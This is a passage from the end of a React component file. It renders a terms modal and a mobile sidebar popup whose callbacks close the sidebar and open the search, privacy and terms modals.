                } }
                selectedQuestion={ selectedPrivacyQuestion }
                texts={ texts }
            />
            <TermsModal show={ showTermsModal } onClose={ () => setShowTermsModal( false ) } texts={ texts } />

            { showMobileSidebar && (
                <div className="popup show" id="popup" onClick={ () => setShowMobileSidebar( false ) } style={ { display: 'block' } }>
                    <div className="popup-item" onClick={ ( e ) => e.stopPropagation() }>
                        <div className="burger-button-popup" id="closePopup" onClick={ () => setShowMobileSidebar( false ) } style={ { cursor: 'pointer' } }>
                            <div className="bar"></div>
                            <div className="bar"></div>
                        </div>
                        <div className="popup-content">
                            <Sidebar
                                texts={ texts }
                                onOpenSearchModal={ () =>
                                {
                                    setShowMobileSidebar( false );
                                    setShowSearchModal( true );
                                } }
                                onOpenPrivacyModal={ ( question ) =>
                                {
                                    setShowMobileSidebar( false );
                                    setSelectedPrivacyQuestion( question );
                                    setShowPrivacyModal( true );
                                } }
                                onOpenTermsModal={ () =>
                                {
                                    setShowMobileSidebar( false );
                                    setShowTermsModal( true );
                                } }
                            />
                        </div>
                    </div>
                </div>
            ) }
        </>
    );
};

export default Home;

